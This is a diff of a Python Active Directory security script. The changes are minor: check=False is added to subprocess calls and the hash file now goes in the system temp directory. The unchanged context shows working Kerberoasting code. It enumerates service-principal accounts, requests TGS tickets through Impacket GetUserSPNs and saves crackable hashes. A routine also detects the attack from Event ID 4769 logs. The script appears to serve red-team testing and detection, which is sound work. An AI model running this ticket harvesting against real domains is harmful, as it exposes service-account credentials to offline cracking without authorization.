@@ -4,6 +4,7 @@
 import json
 import argparse
 import subprocess
+import tempfile
 from pathlib import Path
 
 
@@ -14,7 +15,7 @@ def enumerate_spn_accounts(domain=None):
            "(&(objectClass=user)(servicePrincipalName=*))",
            "sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet"]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
         accounts = []
         current = {}
         for line in result.stdout.splitlines():
@@ -49,7 +50,7 @@ def _powershell_spn_enum(domain):
            "Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,@{N='Groups';E={$_.MemberOf}} | "
            "ConvertTo-Json -Depth 3"]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
         data = json.loads(result.stdout)
         if isinstance(data, dict):
             data = [data]
@@ -62,13 +63,13 @@ def _powershell_spn_enum(domain):
 
 def request_tgs_tickets(domain, username=None):
     """Request TGS tickets for Kerberoasting using Impacket GetUserSPNs."""
+    hash_file = Path(tempfile.gettempdir()) / "kerberoast_hashes.txt"
     cmd = ["python3", "-m", "impacket.examples.GetUserSPNs",
-           f"{domain}/", "-request", "-outputfile", "/tmp/kerberoast_hashes.txt"]
+           f"{domain}/", "-request", "-outputfile", str(hash_file)]
     if username:
         cmd += ["-target-user", username]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-        hash_file = Path("/tmp/kerberoast_hashes.txt")
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60, check=False)
         hashes = []
         if hash_file.exists():
             for line in hash_file.read_text().strip().splitlines():
@@ -137,7 +138,7 @@ def detect_kerberoasting(evtx_file=None):
         return {"evtx_file": evtx_file, "suspicious_tgs_requests": len(suspicious), "events": suspicious[:20]}
     cmd = ["wevtutil", "qe", "Security", "/q:*[System[EventID=4769]]", "/f:text", "/c:100"]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
         rc4_count = result.stdout.lower().count("0x17")
         return {"source": "live_event_log", "total_4769_events": result.stdout.count("Event ID"), "rc4_ticket_requests": rc4_count}
     except Exception as e:
